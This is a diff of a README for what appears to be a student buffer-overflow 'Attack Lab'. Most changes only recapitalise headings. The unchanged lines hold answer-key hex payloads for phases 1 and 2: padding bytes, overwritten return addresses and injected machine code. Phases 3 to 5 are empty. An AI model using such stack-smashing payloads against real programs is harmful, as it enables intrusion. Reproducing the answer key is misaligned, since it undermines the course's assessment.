@@ -1,8 +1,8 @@
-# attack_lab
-See assignment details at attacklab.pdf.
+# Attack Lab
+See assignment details at attacklab.pdf.  
 See guide at https://github.com/magna25/Attack-Lab/.
 
-## phase 1 solution
+## Phase 1 Solution
 ```
 // 40 bytes
 11 11 11 11 11 11 11 11 11 11
@@ -13,7 +13,7 @@ See guide at https://github.com/magna25/Attack-Lab/.
 74 16 40 00 00 00 00 00
 ```
 
-## phase 2 solution
+## Phase 2 Solution
 ```
 // injected code with total 40 bytes
 48 c7 c7 1f 25 3c 37 c3
@@ -24,8 +24,8 @@ See guide at https://github.com/magna25/Attack-Lab/.
 a0 16 40 00 00 00 00 00 
 ```
 
-## phase 3 solution
+## Phase 3 Solution
 
-## phase 4 solution
+## Phase 4 Solution
 
-## phase 5 solution
+## Phase 5 Solution
